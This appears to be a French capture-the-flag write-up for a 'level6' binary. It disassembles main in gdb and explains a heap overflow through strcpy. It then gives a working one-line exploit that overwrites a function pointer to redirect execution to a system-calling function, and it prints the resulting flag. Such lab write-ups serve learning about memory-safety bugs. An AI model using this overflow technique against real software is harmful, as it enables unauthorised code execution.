.level6
SEGV

./level6 yy
Nope

(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)             allocation de 64
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>   appel à malloc
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)              allocation de 4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>   appel à malloc
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax                    pointe sur m
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.

m est la fonction qui affiche "Nope"
Il y a l'appel system dans n, fonction qui n'est pas appelée

On pourrait essayer d'appeler n à la place de m
<m> 0x08048468
<n> 0x08048454

Or en +84, on a un pointeur sur fonction qui pointe vers m, adresse contenue dans notre 2e malloc de 4

Grâce à Wiremask, on trouve que l'offset est de 72: 64 + 8 de boundary tag
Donc après avoir écrit l'entièreté des 72, on écrira dans les 4 du 2e malloc.
On peut ainsi écraser l'adresse de m par l'adresse de n. En +84, on fera alors appel à la fonction n.

./level6 $(python -c 'print 72*"A"+"\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d